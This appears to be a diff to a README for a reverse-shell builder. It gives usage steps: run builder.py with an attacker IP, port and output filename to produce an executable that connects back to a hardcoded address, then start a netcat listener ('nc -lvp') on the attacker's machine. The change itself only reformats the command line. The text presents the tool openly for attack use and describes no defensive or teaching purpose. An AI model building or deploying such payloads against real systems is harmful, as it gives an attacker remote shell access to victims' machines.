@@ -11,7 +11,8 @@ The generated executable file connects to a hardcoded IP address and port number
 
 * Clone the repository or download the code.
 * Navigate to the directory that contains the builder.py script.
-* Run the following command [the output filename must be different then RevShell.py]: "python builder.py IP-address port-number output-filename" 
+
+* Run the following command [filename must be different then RevShell.py]: <b>python builder.py IP-address port-number output-filename</b> 
 Once the script has finished executing, the generated executable file will be located at dist in the same directory as the builder.py script.
 
 * On the attacker's machine, establish a netcat listener on the specified port: nc -lvp <port number>.
